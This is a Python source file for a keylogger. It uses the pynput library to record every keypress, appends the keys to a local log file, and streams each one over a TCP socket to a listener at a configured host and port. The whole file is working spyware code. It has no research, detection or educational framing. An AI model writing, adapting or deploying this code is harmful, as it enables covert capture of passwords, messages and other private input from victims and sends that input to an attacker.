from pynput.keyboard import Listener
import socket
from six.moves import input
HOST = '127.0.0.1'
PORT = 5050
tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
dest = (HOST, PORT)
tcp.connect(dest)
logFile = 'log.txt'
def writelog(key):
	keydata = str(key)
	with open(logFile, "a") as f:
		if (keydata == 'Key.enter'):
			menssage  = "\n"
			f.write(menssage);
			while menssage  >= '\x18':
				tcp.send(menssage .encode())
				break
		elif (keydata == 'Key.space'):
			menssage  = " "
			f.write(menssage)
			while menssage  >= '\x18':
				tcp.send(menssage .encode())
				break
		elif (keydata == 'Key.shift'):
			menssage  = ""
			f.write(menssage)
			while menssage  >= '\x18':
				tcp.send(menssage .encode())
				break
		elif (keydata == 'Key.backspace'):
			with open(logFile, 'rb+') as f:
			    f.seek(0,2)
			    size=f.tell()
			    f.truncate(size-1)
		elif (keydata == 'Key.ctrl_l'):
			menssage  = " (CTRL L) "
			f.write(menssage)
			while menssage  >= '\x18':
				tcp.send(menssage .encode())
				break
		elif (keydata == 'Key.ctrl_r'):
			menssage  = " (CTRL R) "
			f.write(menssage)
			while menssage  >= '\x18':
				tcp.send(menssage .encode())
				break
		elif (keydata == 'Key.ctrl'):
			menssage  = " (CTRL) "
			f.write(menssage)
			while menssage  >= '\x18':
				tcp.send(menssage .encode())
				break
		elif (keydata == 'Key.alt'):
			menssage  = " (ALT) "
			f.write(menssage)
			while menssage  >= '\x18':
				tcp.send(menssage .encode())
				break
		elif (keydata == 'Key.cmd'):
			menssage  = " (WIDOWNS) "
			f.write(menssage)
			while menssage  >= '\x18':
				tcp.send(menssage .encode())
				break
		elif (keydata == 'Key.caps_lock'):
			menssage  = " (CAPSLOCK) "
			f.write(menssage)
			while menssage  >= '\x18':
				tcp.send(menssage .encode())
				break
		elif (keydata == 'Key.tab'):
			menssage  = " (TAB) "
			f.write(menssage)
			while menssage  >= '\x18':
				tcp.send(menssage .encode())
				break
		elif (keydata == 'Key.num_lock'):
			menssage  = " (NUM_LOCK) "
			f.write(menssage)
			while menssage  >= '\x18':
				tcp.send(menssage .encode())
				break
		else:
			keydata = keydata.replace("'","")
			f.write(keydata)
			menssage  = keydata
			while menssage  >= '\x18':
				tcp.send(menssage .encode())
				break
with Listener(on_press=writelog) as l:
	l.join()
